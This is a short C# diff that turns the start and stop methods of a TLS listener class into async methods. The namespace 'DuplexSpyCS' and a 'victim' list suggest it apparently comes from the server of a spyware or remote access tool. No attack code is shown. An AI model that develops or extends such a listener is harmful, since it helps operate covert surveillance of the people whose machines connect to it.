@@ -42,7 +42,7 @@ namespace DuplexSpyCS
 
         ~clsTlsListener() => fnStop();
 
-        public override void fnStart()
+        public override async Task fnStart()
         {
             if (m_bIslistening)
             {
@@ -71,7 +71,7 @@ namespace DuplexSpyCS
             fnOnListenerStarted(this);
         }
 
-        public override void fnStop()
+        public override async Task fnStop()
         {
             foreach (var victim in m_lsVictim)
             {
